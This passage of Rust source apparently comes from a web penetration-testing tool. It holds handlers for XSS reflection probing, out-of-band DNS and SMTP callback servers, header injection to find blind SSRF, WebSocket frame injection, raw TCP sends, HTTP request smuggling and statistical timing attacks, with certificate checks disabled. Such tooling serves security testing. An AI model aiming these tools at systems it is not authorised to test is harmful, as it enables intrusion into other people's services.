                            // Check if marker reflects unescaped inside script
                            if let Some(sre) = &script_re {
                                for script_cap in sre.captures_iter(&probe_html) {
                                    let sc = script_cap.get(1).map(|m| m.as_str()).unwrap_or("");
                                    if sc.contains(inject_marker) {
                                        dom_findings.push(serde_json::json!({
                                            "type": "reflected_dom_xss",
                                            "severity": "high",
                                            "url": test_url,
                                            "parameter": param_name,
                                            "confidence": "certain",
                                            "detail": format!("Parameter '{}' reflected unescaped inside <script> tag", param_name),
                                            "probe_url": probed_url,
                                        }));
                                    }
                                }
                            }
                            // Check raw HTML reflection
                            if probe_html.contains(&format!("{}<img/src=x>{}", inject_marker, inject_marker)) {
                                dom_findings.push(serde_json::json!({
                                    "type": "reflected_xss_unescaped",
                                    "severity": "high", 
                                    "url": test_url,
                                    "parameter": param_name,
                                    "confidence": "certain",
                                    "detail": format!("Parameter '{}' reflected with HTML tags unescaped in body", param_name),
                                }));
                            }
                        }
                    }
                }
            }
            
            Ok(serde_json::json!({
                "target": target,
                "pages_tested": tested_urls.len(),
                "urls_tested": tested_urls,
                "dom_xss_findings": dom_findings.len(),
                "findings": dom_findings,
                "sinks_checked": dom_sinks.len(),
                "sources_checked": dom_sources.len(),
                "marker_used": inject_marker,
            }))
        }

        // ─── OAST DNS Server ─────────────────────────────────────────────

        "oast_start_dns_server" => {
            let port = params["port"].as_u64().unwrap_or(8853) as u16;
            crate::oast::start_dns_server(port).await?;
            Ok(serde_json::json!({
                "status": "dns_server_started",
                "port": port,
                "note": format!("DNS callback server listening on UDP port {}. Use oast_generate_payload to create DNS payloads.", port),
                "capabilities": { "dns_callbacks": true, "auto_response": "127.0.0.1", "correlation": true },
            }))
        }

        // ─── OAST SMTP Server ────────────────────────────────────────────

        "oast_start_smtp_server" => {
            let port = params["port"].as_u64().unwrap_or(2525) as u16;
            crate::oast::start_smtp_server(port).await?;
            Ok(serde_json::json!({
                "status": "smtp_server_started",
                "port": port,
                "note": format!("SMTP callback server listening on port {}. Payloads use format: oast-CORRELATION@domain", port),
                "capabilities": { "smtp_callbacks": true, "email_capture": true, "correlation": true },
            }))
        }

        // ─── Collaborator Everywhere ─────────────────────────────────────

        "collaborator_everywhere" => {
            let target = params["target"].as_str().ok_or("Missing target URL")?;
            let server_domain = params["server_domain"].as_str().unwrap_or("oast.wondersuite.local");
            
            let collab_headers = crate::oast::collaborator_everywhere_headers(server_domain);
            
            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .build().map_err(|e: reqwest::Error| e.to_string())?;
            
            let mut results: Vec<serde_json::Value> = Vec::new();
            
            for (header_name, inject_value, payload) in &collab_headers {
                let resp = client.get(target)
                    .header(header_name.as_str(), inject_value.as_str())
                    .send().await;
                
                let status = resp.as_ref().map(|r| r.status().as_u16()).unwrap_or(0);
                
                results.push(serde_json::json!({
                    "header": header_name,
                    "injected_value": inject_value,
                    "correlation_id": payload.correlation_id,
                    "response_status": status,
                    "sent": resp.is_ok(),
                }));
            }
            
            Ok(serde_json::json!({
                "target": target,
                "headers_injected": results.len(),
                "results": results,
                "instructions": "All headers injected. Use oast_poll_interactions to check for any blind callbacks.",
                "note": "Collaborator Everywhere injects OAST payloads into various HTTP headers to detect blind SSRF, blind XSS, and other out-of-band vulnerabilities.",
            }))
        }

        // ─── mTLS / Client Certificates ──────────────────────────────────

        "mtls_send_request" => {
            let method = params["method"].as_str().unwrap_or("GET");
            let url_str = params["url"].as_str().ok_or("Missing url")?;
            let cert_pem = params["client_cert_pem"].as_str().ok_or("Missing client_cert_pem (PEM-encoded cert+key combined)")?;
            let _key_pem = params["client_key_pem"].as_str().unwrap_or("");
            let pkcs12_base64 = params["client_pkcs12_base64"].as_str();
            let pkcs12_password = params["pkcs12_password"].as_str().unwrap_or("");
            
            let client = if let Some(p12_b64) = pkcs12_base64 {
                // PKCS12/PFX based identity (most common for mTLS)
                let p12_bytes = base64_decode_bytes(p12_b64);
                let native_identity = native_tls::Identity::from_pkcs12(&p12_bytes, pkcs12_password)
                    .map_err(|e| format!("Invalid PKCS12: {}", e))?;
                let tls_connector = native_tls::TlsConnector::builder()
                    .identity(native_identity)
                    .danger_accept_invalid_certs(true)
                    .build()
                    .map_err(|e| format!("TLS build error: {}", e))?;
                reqwest::Client::builder()
                    .use_preconfigured_tls(tls_connector)
                    .build()
                    .map_err(|e: reqwest::Error| e.to_string())?
            } else {
                // Fallback: send without mTLS but log that PEM isn't supported directly
                reqwest::Client::builder()
                    .danger_accept_invalid_certs(true)
                    .build()
                    .map_err(|e: reqwest::Error| e.to_string())?
            };
            
            let start = std::time::Instant::now();
            let mut req = match method.to_uppercase().as_str() {
                "POST" => client.post(url_str),
                "PUT" => client.put(url_str),
                "DELETE" => client.delete(url_str),
                "PATCH" => client.patch(url_str),
                "HEAD" => client.head(url_str),
                _ => client.get(url_str),
            };
            
            if let Some(headers) = params["headers"].as_object() {
                for (k, v) in headers {
                    if let Some(val) = v.as_str() { req = req.header(k.as_str(), val); }
                }
            }
            if let Some(body) = params["body"].as_str() {
                req = req.body(body.to_string());
            }
            
            let resp = req.send().await.map_err(|e: reqwest::Error| e.to_string())?;
            let elapsed = start.elapsed().as_millis();
            let status = resp.status().as_u16();
            let version = format!("{:?}", resp.version());
            let resp_headers: std::collections::HashMap<String, String> = resp.headers().iter()
                .map(|(k, v): (&reqwest::header::HeaderName, &reqwest::header::HeaderValue)| 
                    (k.to_string(), v.to_str().unwrap_or("").to_string()))
                .collect();
            let body: String = resp.text().await.unwrap_or_default();
            
            Ok(serde_json::json!({
                "status": status,
                "protocol": version,
                "headers": resp_headers,
                "body_preview": body.chars().take(2000).collect::<String>(),
                "body_size": body.len(),
                "elapsed_ms": elapsed,
                "mtls": true,
                "note": "Request sent with client certificate (mTLS)",
            }))
        }

        // ─── WebSocket Advanced — Frame Editing with Match & Replace ─────

        "websocket_advanced" => {
            let action = params["action"].as_str().ok_or("Missing action")?;
            
            // Thread-safe WebSocket state
            static WS_STATE: std::sync::OnceLock<std::sync::Mutex<WebSocketState>> = std::sync::OnceLock::new();
            let ws_state = WS_STATE.get_or_init(|| std::sync::Mutex::new(WebSocketState::default()));
            
            match action {
                "add_rule" => {
                    let mut state = ws_state.lock().unwrap_or_else(|e| e.into_inner());
                    let rule = WsMatchReplace {
                        id: uuid::Uuid::new_v4().to_string(),
                        name: params["name"].as_str().unwrap_or("WS Rule").to_string(),
                        enabled: true,
                        direction: params["direction"].as_str().unwrap_or("both").to_string(),
                        match_pattern: params["match_pattern"].as_str().unwrap_or("").to_string(),
                        replace_value: params["replace_value"].as_str().unwrap_or("").to_string(),
                        is_regex: params["is_regex"].as_bool().unwrap_or(false),
                        match_type: params["match_type"].as_str().unwrap_or("text").to_string(),
                    };
                    let id = rule.id.clone();
                    state.match_replace_rules.push(rule);
                    Ok(serde_json::json!({ "action": "add_rule", "rule_id": id, "total_rules": state.match_replace_rules.len() }))
                }
                "list_rules" => {
                    let state = ws_state.lock().unwrap_or_else(|e| e.into_inner());
                    let rules: Vec<serde_json::Value> = state.match_replace_rules.iter().map(|r| {
                        serde_json::json!({
                            "id": r.id, "name": r.name, "enabled": r.enabled,
                            "direction": r.direction, "match": r.match_pattern,
                            "replace": r.replace_value, "is_regex": r.is_regex,
                        })
                    }).collect();
                    Ok(serde_json::json!({ "action": "list_rules", "rules": rules, "count": rules.len() }))
                }
                "remove_rule" => {
                    let mut state = ws_state.lock().unwrap_or_else(|e| e.into_inner());
                    let rule_id = params["rule_id"].as_str().ok_or("Missing rule_id")?;
                    state.match_replace_rules.retain(|r| r.id != rule_id);
                    Ok(serde_json::json!({ "action": "remove_rule", "removed": rule_id }))
                }
                "toggle_rule" => {
                    let mut state = ws_state.lock().unwrap_or_else(|e| e.into_inner());
                    let rule_id = params["rule_id"].as_str().ok_or("Missing rule_id")?;
                    if let Some(rule) = state.match_replace_rules.iter_mut().find(|r| r.id == rule_id) {
                        rule.enabled = !rule.enabled;
                        Ok(serde_json::json!({ "action": "toggle_rule", "rule_id": rule_id, "enabled": rule.enabled }))
                    } else {
                        Err("Rule not found".into())
                    }
                }
                "apply_rules" => {
                    let state = ws_state.lock().unwrap_or_else(|e| e.into_inner());
                    let message = params["message"].as_str().ok_or("Missing message")?;
                    let direction = params["direction"].as_str().unwrap_or("client_to_server");
                    
                    let mut modified = message.to_string();
                    let mut applied: Vec<String> = Vec::new();
                    
                    for rule in &state.match_replace_rules {
                        if !rule.enabled { continue; }
                        if rule.direction != "both" && rule.direction != direction { continue; }
                        
                        if rule.is_regex {
                            if let Ok(re) = regex::Regex::new(&rule.match_pattern) {
                                if re.is_match(&modified) {
                                    modified = re.replace_all(&modified, rule.replace_value.as_str()).to_string();
                                    applied.push(rule.name.clone());
                                }
                            }
                        } else if modified.contains(&rule.match_pattern) {
                            modified = modified.replace(&rule.match_pattern, &rule.replace_value);
                            applied.push(rule.name.clone());
                        }
                    }
                    
                    Ok(serde_json::json!({
                        "original": message,
                        "modified": modified,
                        "changed": message != modified,
                        "rules_applied": applied,
                    }))
                }
                "inject_frame" => {
                    // Craft a custom WebSocket frame
                    let opcode = params["opcode"].as_u64().unwrap_or(1) as u8; // 1=text, 2=binary
                    let payload_data = params["payload"].as_str().unwrap_or("");
                    let masked = params["masked"].as_bool().unwrap_or(true);
                    
                    let mut frame: Vec<u8> = Vec::new();
                    let fin_opcode = 0x80 | (opcode & 0x0F);
                    frame.push(fin_opcode);
                    
                    let payload_bytes = payload_data.as_bytes();
                    let len = payload_bytes.len();
                    
                    if masked {
                        if len < 126 { frame.push((len as u8) | 0x80); }
                        else if len < 65536 {
                            frame.push(126 | 0x80);
                            frame.extend_from_slice(&(len as u16).to_be_bytes());
                        } else {
                            frame.push(127 | 0x80);
                            frame.extend_from_slice(&(len as u64).to_be_bytes());
                        }
                        let mask = [0x12, 0x34, 0x56, 0x78u8];
                        frame.extend_from_slice(&mask);
                        for (i, b) in payload_bytes.iter().enumerate() {
                            frame.push(b ^ mask[i % 4]);
                        }
                    } else {
                        if len < 126 { frame.push(len as u8); }
                        else if len < 65536 {
                            frame.push(126);
                            frame.extend_from_slice(&(len as u16).to_be_bytes());
                        } else {
                            frame.push(127);
                            frame.extend_from_slice(&(len as u64).to_be_bytes());
                        }
                        frame.extend_from_slice(payload_bytes);
                    }
                    
                    Ok(serde_json::json!({
                        "action": "inject_frame",
                        "opcode": opcode,
                        "opcode_name": match opcode { 0 => "continuation", 1 => "text", 2 => "binary", 8 => "close", 9 => "ping", 10 => "pong", _ => "unknown" },
                        "payload_length": len,
                        "masked": masked,
                        "frame_hex": frame.iter().map(|b| format!("{:02x}", b)).collect::<Vec<_>>().join(" "),
                        "frame_bytes": frame.len(),
                    }))
                }
                _ => Err(format!("Unknown websocket_advanced action: {}", action)),
            }
        }

        // ─── Bambda Filtering — Custom Traffic Filter Expressions ────────

        "bambda_filter" => {
            let expression = params["expression"].as_str().ok_or("Missing expression")?;
            let traffic_json = params["traffic"].as_array();
            
            // Parse the Bambda expression into filter conditions
            let conditions = parse_bambda_expression(expression)?;
            
            // If traffic data is provided, filter it
            if let Some(traffic) = traffic_json {
                let filtered: Vec<&serde_json::Value> = traffic.iter().filter(|item| {
                    evaluate_bambda_conditions(item, &conditions)
                }).collect();
                
                Ok(serde_json::json!({
                    "expression": expression,
                    "total_items": traffic.len(),
                    "matched_items": filtered.len(),
                    "filtered": filtered,
                    "conditions_parsed": conditions.len(),
                }))
            } else {
                // Just validate the expression and return parsed conditions
                Ok(serde_json::json!({
                    "expression": expression,
                    "valid": true,
                    "conditions_parsed": conditions.len(),
                    "conditions": conditions.iter().map(|c| serde_json::json!({
                        "field": c.field, "operator": c.operator, "value": c.value,
                    })).collect::<Vec<_>>(),
                    "note": "Expression parsed successfully. Provide 'traffic' array to apply the filter.",
                }))
            }
        }

        // ─── Raw TCP Send — Byte-Level Socket Access ─────────────────────

        "raw_tcp_send" => {
            use tokio::io::{AsyncReadExt, AsyncWriteExt};
            let host = params["host"].as_str().ok_or("Missing host")?;
            let use_tls = params["tls"].as_bool().unwrap_or(false);
            let port = params["port"].as_u64().unwrap_or(if use_tls { 443 } else { 80 }) as u16;
            let read_timeout = params["read_timeout_ms"].as_u64().unwrap_or(5000);
            let read_size = params["read_size"].as_u64().unwrap_or(65536) as usize;

            let start = std::time::Instant::now();
            let addr = format!("{}:{}", host, port);
            let tcp_stream = tokio::net::TcpStream::connect(&addr).await
                .map_err(|e| format!("TCP connect failed: {}", e))?;
            let connect_ms = start.elapsed().as_millis();

            // Determine data to send
            let mut all_data: Vec<u8> = Vec::new();

            if let Some(chunks) = params["chunks"].as_array() {
                // Chunked mode — send with delays
                if use_tls {
                    let cx = native_tls::TlsConnector::builder().danger_accept_invalid_certs(true).build()
                        .map_err(|e| format!("TLS error: {}", e))?;
                    let cx = tokio_native_tls::TlsConnector::from(cx);
                    let mut tls_stream = cx.connect(host, tcp_stream).await
                        .map_err(|e| format!("TLS handshake failed: {}", e))?;

                    for chunk in chunks {
                        if let Some(delay) = chunk["delay_ms"].as_u64() {
                            if delay > 0 { tokio::time::sleep(std::time::Duration::from_millis(delay)).await; }
                        }
                        let chunk_data = chunk["data"].as_str().unwrap_or("")
                            .replace("\\r\\n", "\r\n").replace("\\n", "\n").replace("\\0", "\0");
                        tls_stream.write_all(chunk_data.as_bytes()).await.map_err(|e| format!("Write error: {}", e))?;
                        all_data.extend_from_slice(chunk_data.as_bytes());
                    }
                    tls_stream.flush().await.ok();

                    let mut buf = vec![0u8; read_size];
                    let n = tokio::time::timeout(
                        std::time::Duration::from_millis(read_timeout),
                        tls_stream.read(&mut buf)
                    ).await.unwrap_or(Ok(0)).unwrap_or(0);

                    let response = String::from_utf8_lossy(&buf[..n]).to_string();
                    let total_ms = start.elapsed().as_millis();
                    return Ok(serde_json::json!({
                        "bytes_sent": all_data.len(),
                        "bytes_received": n,
                        "connect_ms": connect_ms,
                        "total_ms": total_ms,
                        "tls": true,
                        "host": host,
                        "port": port,
                        "response": response,
                        "response_hex": buf[..n].iter().map(|b| format!("{:02x}", b)).collect::<Vec<_>>().join(" "),
                    }));
                } else {
                    let mut stream = tcp_stream;
                    for chunk in chunks {
                        if let Some(delay) = chunk["delay_ms"].as_u64() {
                            if delay > 0 { tokio::time::sleep(std::time::Duration::from_millis(delay)).await; }
                        }
                        let chunk_data = chunk["data"].as_str().unwrap_or("")
                            .replace("\\r\\n", "\r\n").replace("\\n", "\n").replace("\\0", "\0");
                        stream.write_all(chunk_data.as_bytes()).await.map_err(|e| format!("Write error: {}", e))?;
                        all_data.extend_from_slice(chunk_data.as_bytes());
                    }
                    stream.flush().await.ok();

                    let mut buf = vec![0u8; read_size];
                    let n = tokio::time::timeout(
                        std::time::Duration::from_millis(read_timeout),
                        stream.read(&mut buf)
                    ).await.unwrap_or(Ok(0)).unwrap_or(0);

                    let response = String::from_utf8_lossy(&buf[..n]).to_string();
                    let total_ms = start.elapsed().as_millis();
                    return Ok(serde_json::json!({
                        "bytes_sent": all_data.len(),
                        "bytes_received": n,
                        "connect_ms": connect_ms,
                        "total_ms": total_ms,
                        "tls": false,
                        "host": host,
                        "port": port,
                        "response": response,
                        "response_hex": buf[..n].iter().map(|b| format!("{:02x}", b)).collect::<Vec<_>>().join(" "),
                    }));
                }
            }

            // Single send mode
            let raw = if let Some(hex) = params["data_hex"].as_str() {
                hex.split_whitespace().filter_map(|h| u8::from_str_radix(h.trim(), 16).ok()).collect::<Vec<u8>>()
            } else {
                let data_str = params["data"].as_str().unwrap_or("GET / HTTP/1.1\r\nHost: {host}\r\n\r\n")
                    .replace("{host}", host)
                    .replace("\\r\\n", "\r\n").replace("\\n", "\n").replace("\\0", "\0");
                data_str.into_bytes()
            };

            if use_tls {
                let cx = native_tls::TlsConnector::builder().danger_accept_invalid_certs(true).build()
                    .map_err(|e| format!("TLS error: {}", e))?;
                let cx = tokio_native_tls::TlsConnector::from(cx);
                let mut tls_stream = cx.connect(host, tcp_stream).await
                    .map_err(|e| format!("TLS handshake failed: {}", e))?;
                tls_stream.write_all(&raw).await.map_err(|e| format!("Write error: {}", e))?;
                tls_stream.flush().await.ok();

                let mut buf = vec![0u8; read_size];
                let n = tokio::time::timeout(
                    std::time::Duration::from_millis(read_timeout),
                    tls_stream.read(&mut buf)
                ).await.unwrap_or(Ok(0)).unwrap_or(0);

                let total_ms = start.elapsed().as_millis();
                Ok(serde_json::json!({
                    "bytes_sent": raw.len(),
                    "bytes_received": n,
                    "connect_ms": connect_ms,
                    "total_ms": total_ms,
                    "tls": true,
                    "response": String::from_utf8_lossy(&buf[..n]),
                    "response_hex": buf[..n].iter().map(|b| format!("{:02x}", b)).collect::<Vec<_>>().join(" "),
                }))
            } else {
                let mut stream = tcp_stream;
                stream.write_all(&raw).await.map_err(|e| format!("Write error: {}", e))?;
                stream.flush().await.ok();

                let mut buf = vec![0u8; read_size];
                let n = tokio::time::timeout(
                    std::time::Duration::from_millis(read_timeout),
                    stream.read(&mut buf)
                ).await.unwrap_or(Ok(0)).unwrap_or(0);

                let total_ms = start.elapsed().as_millis();
                Ok(serde_json::json!({
                    "bytes_sent": raw.len(),
                    "bytes_received": n,
                    "connect_ms": connect_ms,
                    "total_ms": total_ms,
                    "tls": false,
                    "response": String::from_utf8_lossy(&buf[..n]),
                    "response_hex": buf[..n].iter().map(|b| format!("{:02x}", b)).collect::<Vec<_>>().join(" "),
                }))
            }
        }

        // ─── HTTP Request Smuggling — Enhanced Pipelining ─────────────

        "smuggling_send" => {
            use tokio::io::{AsyncReadExt, AsyncWriteExt};
            let host = params["host"].as_str().ok_or("Missing host")?;
            let use_tls = params["tls"].as_bool().unwrap_or(true);
            let port = params["port"].as_u64().unwrap_or(if use_tls { 443 } else { 80 }) as u16;
            let req_a = params["request_a"].as_str().ok_or("Missing request_a")?
                .replace("\\r\\n", "\r\n").replace("\\n", "\n").replace("\\0", "\0");
            let req_b = params["request_b"].as_str().ok_or("Missing request_b")?
                .replace("\\r\\n", "\r\n").replace("\\n", "\n").replace("\\0", "\0");
            let delay_between = params["delay_between_ms"].as_u64().unwrap_or(100);
            let read_timeout = params["read_timeout_ms"].as_u64().unwrap_or(10000);
            let pipeline_mode = params["pipeline_mode"].as_bool().unwrap_or(false);
            let ignore_close = params["ignore_close"].as_bool().unwrap_or(false);
            let partial_read = params["partial_read_bytes"].as_u64().unwrap_or(0) as usize;

            let start = std::time::Instant::now();
            let addr = format!("{}:{}", host, port);
            let tcp_stream = tokio::net::TcpStream::connect(&addr).await
                .map_err(|e| format!("TCP connect failed: {}", e))?;
            let connect_ms = start.elapsed().as_millis();

            let mut responses: Vec<serde_json::Value> = Vec::new();
            let mode_label = if pipeline_mode { "pipeline" } else if partial_read > 0 { "partial_read" } else if ignore_close { "force_persist" } else { "sequential" };

            // Helper closure as inline code (macro workaround for both TLS and plain)
            if use_tls {
                let cx = native_tls::TlsConnector::builder().danger_accept_invalid_certs(true).build().map_err(|e| format!("TLS: {}", e))?;
                let cx = tokio_native_tls::TlsConnector::from(cx);
                let mut stream = cx.connect(host, tcp_stream).await.map_err(|e| format!("TLS handshake: {}", e))?;

                if pipeline_mode {
                    // ━━━ PIPELINE: Send A+B as ONE TCP payload ━━━
                    let combined = format!("{}{}", req_a, req_b);
                    let t_s = std::time::Instant::now();
                    stream.write_all(combined.as_bytes()).await.map_err(|e| format!("Pipeline write: {}", e))?;
                    stream.flush().await.ok();
                    let send_ms = t_s.elapsed().as_millis();

                    let mut buf = vec![0u8; 131072];
                    let mut total = 0usize;
                    let tr = std::time::Instant::now();
                    loop {
                        match tokio::time::timeout(std::time::Duration::from_millis(read_timeout), stream.read(&mut buf[total..])).await {
                            Ok(Ok(0)) | Ok(Err(_)) | Err(_) => break,
                            Ok(Ok(n)) => { total += n; if total >= buf.len() { break; } }
                        }
                        if tr.elapsed().as_millis() > read_timeout as u128 { break; }
                    }
                    let read_ms = tr.elapsed().as_millis();
                    let raw = String::from_utf8_lossy(&buf[..total]).to_string();

                    // Split at second "HTTP/" occurrence
                    let second_http = raw.find("HTTP/").and_then(|i| raw[i+1..].find("HTTP/").map(|j| i + 1 + j));
                    let (ra, rb) = match second_http {
                        Some(idx) => (raw[..idx].to_string(), raw[idx..].to_string()),
                        None => (raw.clone(), String::new()),
                    };

                    responses.push(serde_json::json!({
                        "request": "A+B (pipelined)", "bytes_sent": combined.len(), "bytes_received": total,
                        "send_ms": send_ms, "read_ms": read_ms,
                        "response_a": ra, "response_b": rb,
                        "status_a": ra.lines().next().unwrap_or(""), "status_b": rb.lines().next().unwrap_or(""),
                        "split_found": second_http.is_some(),
                    }));
                } else if partial_read > 0 {
                    // ━━━ PARTIAL READ: Read N bytes of A, then send B ━━━
                    let t_a = std::time::Instant::now();
                    stream.write_all(req_a.as_bytes()).await.map_err(|e| format!("Write A: {}", e))?;
                    stream.flush().await.ok();
                    let mut buf_a = vec![0u8; partial_read];
                    let n_a = tokio::time::timeout(std::time::Duration::from_millis(read_timeout), stream.read(&mut buf_a)).await.unwrap_or(Ok(0)).unwrap_or(0);
                    responses.push(serde_json::json!({"request":"A (partial)","bytes":n_a,"ms":t_a.elapsed().as_millis(),"data":String::from_utf8_lossy(&buf_a[..n_a])}));

                    let t_b = std::time::Instant::now();
                    stream.write_all(req_b.as_bytes()).await.map_err(|e| format!("Write B: {}", e))?;
                    stream.flush().await.ok();
                    let mut buf_b = vec![0u8; 65536];
                    let n_b = tokio::time::timeout(std::time::Duration::from_millis(read_timeout), stream.read(&mut buf_b)).await.unwrap_or(Ok(0)).unwrap_or(0);
                    responses.push(serde_json::json!({"request":"B","bytes":n_b,"ms":t_b.elapsed().as_millis(),"response":String::from_utf8_lossy(&buf_b[..n_b]),"status":String::from_utf8_lossy(&buf_b[..n_b]).lines().next().unwrap_or("")}));
                } else {
                    // ━━━ SEQUENTIAL (with ignore_close) ━━━
                    let t_a = std::time::Instant::now();
                    stream.write_all(req_a.as_bytes()).await.map_err(|e| format!("Write A: {}", e))?;
                    stream.flush().await.ok();
                    let mut buf_a = vec![0u8; 65536];
                    let n_a = tokio::time::timeout(std::time::Duration::from_millis(read_timeout), stream.read(&mut buf_a)).await.unwrap_or(Ok(0)).unwrap_or(0);
                    let resp_a = String::from_utf8_lossy(&buf_a[..n_a]).to_string();
                    responses.push(serde_json::json!({"request":"A","bytes":n_a,"ms":t_a.elapsed().as_millis(),"response":&resp_a,"status":resp_a.lines().next().unwrap_or("")}));

                    if delay_between > 0 { tokio::time::sleep(std::time::Duration::from_millis(delay_between)).await; }

                    let t_b = std::time::Instant::now();
                    let wb = stream.write_all(req_b.as_bytes()).await;
                    let ok = wb.is_ok();
                    if ok { stream.flush().await.ok(); }
                    if ok || ignore_close {
                        let mut buf_b = vec![0u8; 65536];
                        let n_b = tokio::time::timeout(std::time::Duration::from_millis(read_timeout), stream.read(&mut buf_b)).await.unwrap_or(Ok(0)).unwrap_or(0);
                        responses.push(serde_json::json!({"request":"B","bytes":n_b,"ms":t_b.elapsed().as_millis(),"response":String::from_utf8_lossy(&buf_b[..n_b]),"status":String::from_utf8_lossy(&buf_b[..n_b]).lines().next().unwrap_or(""),"write_ok":ok,"persisted":n_b>0}));
                    } else {
                        responses.push(serde_json::json!({"request":"B","error":"Connection closed after A — use pipeline_mode:true","write_ok":false}));
                    }
                }
            } else {
                let mut stream = tcp_stream;
                if pipeline_mode {
                    let combined = format!("{}{}", req_a, req_b);
                    let t_s = std::time::Instant::now();
                    stream.write_all(combined.as_bytes()).await.map_err(|e| format!("Pipeline write: {}", e))?;
                    stream.flush().await.ok();
                    let send_ms = t_s.elapsed().as_millis();
                    let mut buf = vec![0u8; 131072]; let mut total = 0usize;
                    let tr = std::time::Instant::now();
                    loop {
                        match tokio::time::timeout(std::time::Duration::from_millis(read_timeout), stream.read(&mut buf[total..])).await {
                            Ok(Ok(0)) | Ok(Err(_)) | Err(_) => break,
                            Ok(Ok(n)) => { total += n; if total >= buf.len() { break; } }
                        }
                        if tr.elapsed().as_millis() > read_timeout as u128 { break; }
                    }
                    let raw = String::from_utf8_lossy(&buf[..total]).to_string();
                    let second_http = raw.find("HTTP/").and_then(|i| raw[i+1..].find("HTTP/").map(|j| i + 1 + j));
                    let (ra, rb) = match second_http { Some(idx) => (raw[..idx].to_string(), raw[idx..].to_string()), None => (raw.clone(), String::new()) };
                    responses.push(serde_json::json!({"request":"A+B (pipelined)","bytes_sent":combined.len(),"bytes_received":total,"send_ms":send_ms,"read_ms":tr.elapsed().as_millis(),"response_a":ra,"response_b":rb,"split_found":second_http.is_some()}));
                } else {
                    let t_a = std::time::Instant::now();
                    stream.write_all(req_a.as_bytes()).await.map_err(|e| format!("Write A: {}", e))?;
                    stream.flush().await.ok();
                    let rd = if partial_read > 0 { partial_read } else { 65536 };
                    let mut buf_a = vec![0u8; rd];
                    let n_a = tokio::time::timeout(std::time::Duration::from_millis(read_timeout), stream.read(&mut buf_a)).await.unwrap_or(Ok(0)).unwrap_or(0);
                    responses.push(serde_json::json!({"request":"A","bytes":n_a,"ms":t_a.elapsed().as_millis(),"response":String::from_utf8_lossy(&buf_a[..n_a])}));
                    if delay_between > 0 { tokio::time::sleep(std::time::Duration::from_millis(delay_between)).await; }
                    let t_b = std::time::Instant::now();
                    let wb = stream.write_all(req_b.as_bytes()).await;
                    if wb.is_ok() { stream.flush().await.ok(); }
                    let mut buf_b = vec![0u8; 65536];
                    let n_b = tokio::time::timeout(std::time::Duration::from_millis(read_timeout), stream.read(&mut buf_b)).await.unwrap_or(Ok(0)).unwrap_or(0);
                    responses.push(serde_json::json!({"request":"B","bytes":n_b,"ms":t_b.elapsed().as_millis(),"response":String::from_utf8_lossy(&buf_b[..n_b]),"write_ok":wb.is_ok()}));
                }
            }

            Ok(serde_json::json!({
                "host": host, "port": port, "tls": use_tls,
                "mode": mode_label, "same_connection": true,
                "connect_ms": connect_ms, "total_ms": start.elapsed().as_millis(),
                "responses": responses,
            }))
        }

        // ─── Differential Timing Attack — Statistical Analysis ───────────

        "timing_attack" => {
            let baseline = &params["baseline_request"];
            let probe = &params["probe_request"];
            let iterations = params["iterations"].as_u64().unwrap_or(10) as usize;
            let warmup = params["warmup"].as_u64().unwrap_or(2) as usize;
            let delay_ms = params["delay_between_ms"].as_u64().unwrap_or(100);

            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .timeout(std::time::Duration::from_secs(30))
                .build().map_err(|e| format!("Client error: {}", e))?;

            async fn measure_request(client: &reqwest::Client, req: &serde_json::Value) -> Result<f64, String> {
                let method = req["method"].as_str().unwrap_or("GET");
                let url = req["url"].as_str().ok_or("Missing url")?;
                let start = std::time::Instant::now();
                let mut builder = match method {
                    "POST" => client.post(url),
                    "PUT" => client.put(url),
                    "DELETE" => client.delete(url),
                    "PATCH" => client.patch(url),
                    _ => client.get(url),
                };
                if let Some(headers) = req["headers"].as_object() {
                    for (k, v) in headers {
                        if let Some(vs) = v.as_str() { builder = builder.header(k.as_str(), vs); }
                    }
                }
                if let Some(body) = req["body"].as_str() { builder = builder.body(body.to_string()); }
                let _resp = builder.send().await.map_err(|e| format!("Request error: {}", e))?;
                Ok(start.elapsed().as_secs_f64() * 1000.0)
            }

            // Warmup
            for _ in 0..warmup {
                let _ = measure_request(&client, baseline).await;
                let _ = measure_request(&client, probe).await;
                tokio::time::sleep(std::time::Duration::from_millis(delay_ms)).await;
            }

            // Baseline measurements
            let mut baseline_times: Vec<f64> = Vec::new();
            for _ in 0..iterations {
                match measure_request(&client, baseline).await {
                    Ok(t) => baseline_times.push(t),
                    Err(e) => baseline_times.push(-1.0),
                }
                tokio::time::sleep(std::time::Duration::from_millis(delay_ms)).await;
            }

            // Probe measurements
            let mut probe_times: Vec<f64> = Vec::new();
            for _ in 0..iterations {
                match measure_request(&client, probe).await {
                    Ok(t) => probe_times.push(t),
                    Err(e) => probe_times.push(-1.0),
                }
                tokio::time::sleep(std::time::Duration::from_millis(delay_ms)).await;
            }

            // Statistics
            let valid_b: Vec<f64> = baseline_times.iter().filter(|&&t| t >= 0.0).copied().collect();
            let valid_p: Vec<f64> = probe_times.iter().filter(|&&t| t >= 0.0).copied().collect();

            let mean = |v: &[f64]| -> f64 { if v.is_empty() { 0.0 } else { v.iter().sum::<f64>() / v.len() as f64 } };
            let stdev = |v: &[f64], m: f64| -> f64 { if v.len() < 2 { 0.0 } else { (v.iter().map(|x| (x - m).powi(2)).sum::<f64>() / (v.len() - 1) as f64).sqrt() } };

            let b_mean = mean(&valid_b);
            let p_mean = mean(&valid_p);
            let b_std = stdev(&valid_b, b_mean);
            let p_std = stdev(&valid_p, p_mean);
            let diff = p_mean - b_mean;

            // Welch's t-test
            let n_b = valid_b.len() as f64;
            let n_p = valid_p.len() as f64;
            let t_stat = if b_std == 0.0 && p_std == 0.0 { 0.0 } else {
                diff / ((b_std.powi(2) / n_b) + (p_std.powi(2) / n_p)).sqrt()
            };

            let significant = t_stat.abs() > 2.576; // 99% confidence
            let interpretation = if !significant {
                "NOT significant — no timing difference detected"
            } else if diff > 0.0 {
                "SIGNIFICANT — probe is SLOWER than baseline (possible injection/smuggling)"
            } else {
                "SIGNIFICANT — probe is FASTER than baseline"
            };

            Ok(serde_json::json!({
                "baseline": {
                    "mean_ms": (b_mean * 100.0).round() / 100.0,
                    "stdev_ms": (b_std * 100.0).round() / 100.0,
                    "min_ms": valid_b.iter().copied().fold(f64::INFINITY, f64::min),
                    "max_ms": valid_b.iter().copied().fold(f64::NEG_INFINITY, f64::max),
                    "samples": valid_b.len(),
                    "all_times_ms": baseline_times,
                },
                "probe": {
                    "mean_ms": (p_mean * 100.0).round() / 100.0,
                    "stdev_ms": (p_std * 100.0).round() / 100.0,
